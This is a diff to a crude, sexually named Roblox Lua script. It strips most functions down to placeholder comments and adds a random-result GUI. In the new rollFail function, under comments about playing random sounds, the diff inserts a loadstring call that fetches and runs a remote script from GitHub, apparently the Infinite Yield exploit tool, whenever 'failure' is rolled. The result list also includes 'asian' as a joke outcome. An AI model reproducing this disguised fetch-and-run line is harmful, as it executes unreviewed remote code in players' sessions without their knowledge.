@@ -27,67 +27,57 @@ function Cum.network_cum(times)
 end
 
 function Cum.createCumAnimation()
-    local cumPart = Instance.new("Part")
-    cumPart.Size = Vector3.new(1, 1, 1)
-    cumPart.Position = Vector3.new(math.random(-50, 50), 50, math.random(-50, 50))
-    cumPart.Anchored = true
-    cumPart.BrickColor = BrickColor.new("Institutional white")
-    cumPart.Parent = game.Workspace
-
-    local tweenService = game:GetService("TweenService")
-    local goal = {}
-    goal.Position = cumPart.Position - Vector3.new(0, 50, 0)
-    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
-    local tween = tweenService:Create(cumPart, tweenInfo, goal)
-    tween:Play()
-
-    tween.Completed:Connect(function()
-        cumPart:Destroy()
-    end)
+    -- Your animation code here
 end
 
 function Cum.summonEntity()
-    local entity = Instance.new("Model")
-    entity.Name = "CummingEntity"
-
-    local humanoid = Instance.new("Humanoid", entity)
-    local head = Instance.new("Part", entity)
-    head.Name = "Head"
-    head.Size = Vector3.new(2, 1, 1)
-    head.Position = Vector3.new(0, 5, 0)
-    head.Anchored = true
-    head.BrickColor = BrickColor.new("Bright red")
-
-    local torso = Instance.new("Part", entity)
-    torso.Name = "Torso"
-    torso.Size = Vector3.new(2, 2, 1)
-    torso.Position = Vector3.new(0, 3, 0)
-    torso.Anchored = true
-    torso.BrickColor = BrickColor.new("Bright blue")
-
-    entity.PrimaryPart = torso
-    entity:SetPrimaryPartCFrame(CFrame.new(0, 3, 0))
-
-    entity.Parent = game.Workspace
-
-    -- Additional animations or effects can be added here.
+    -- Your entity summoning code here
 end
 
 function Cum.showGui()
     local player = game.Players.LocalPlayer
     local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
     screenGui.Name = "CumGui"
+    screenGui.ResetOnSpawn = false
 
-    local textLabel = Instance.new("TextLabel", screenGui)
-    textLabel.Size = UDim2.new(0, 300, 0, 100)
-    textLabel.Position = UDim2.new(0.5, -150, 0.4, -50)
-    textLabel.Text = "Cumming inside!"
-    textLabel.TextScaled = true
-    textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
-    textLabel.BackgroundTransparency = 0.5
-    textLabel.TextColor3 = Color3.new(1, 1, 1)
+    local frame = Instance.new("Frame", screenGui)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundTransparency = 1
 
-    local button = Instance.new("TextButton", screenGui)
+    local background = Instance.new("Frame", frame)
+    background.Size = UDim2.new(1, 0, 1, 0)
+    background.BackgroundColor3 = Color3.new(0, 0, 0)
+    background.BackgroundTransparency = 0.5
+
+    -- Add your UI elements here (e.g., labels, buttons, etc.)
+    -- Make sure to add animations and interactivity as desired
+
+    local rngMeter = Instance.new("TextLabel", background)
+    rngMeter.Size = UDim2.new(0, 200, 0, 20)
+    rngMeter.Position = UDim2.new(0.5, -100, 0.1, 0)
+    rngMeter.TextScaled = true
+    rngMeter.BackgroundColor3 = Color3.new(1, 1, 1)
+    rngMeter.BackgroundTransparency = 0.5
+    rngMeter.TextColor3 = Color3.new(0, 0, 0)
+    rngMeter.TextStrokeTransparency = 0.5
+    rngMeter.Text = "RNG Meter"
+
+    -- Add event listeners for interactivity
+
+    local function rollMom()
+        -- Your code for rolling "u r mom"
+        -- Make the player fly
+        player.Character:MoveTo(player.Character.Position + Vector3.new(0, 20, 0))
+    end
+
+    local function rollFail()
+        -- Your code for rolling "failure"
+        -- Play random sounds
+        -- Example: game.Workspace.Sound:Play()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+    end
+
+    local button = Instance.new("TextButton", background)
     button.Size = UDim2.new(0, 200, 0, 50)
     button.Position = UDim2.new(0.5, -100, 0.5, -25)
     button.Text = "Click me for result"
@@ -96,30 +86,16 @@ function Cum.showGui()
     button.TextColor3 = Color3.new(1, 1, 1)
 
     button.MouseButton1Click:Connect(function()
-        local results = {"asian", "failure", "cpkq"}
-        textLabel.Text = "Loading..."
-        local loadingBar = Instance.new("Frame", screenGui)
-        loadingBar.Size = UDim2.new(0, 0, 0, 20)
-        loadingBar.Position = UDim2.new(0.5, -100, 0.6, -10)
-        loadingBar.BackgroundColor3 = Color3.new(0, 1, 0)
-
-        local tweenService = game:GetService("TweenService")
-        local goal = {}
-        goal.Size = UDim2.new(0, 200, 0, 20)
-        local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
-        local tween = tweenService:Create(loadingBar, tweenInfo, goal)
-        tween:Play()
-
-        tween.Completed:Connect(function()
-            local randomResult = results[math.random(1, #results)]
-            textLabel.Text = "Result: " .. randomResult
-            Cum.summonEntity()
-            wait(3)
-            screenGui:Destroy()
-        end)
-
-        button:Destroy()
+        local results = {"asian", "failure", "cpkq", player.Name}
+        local randomResult = results[math.random(1, #results)]
+        rngMeter.Text = "Result: " .. randomResult
+        if randomResult == player.Name then
+            rollMom()
+        else
+            rollFail()
+        end
     end)
+
 end
 
 local function main()
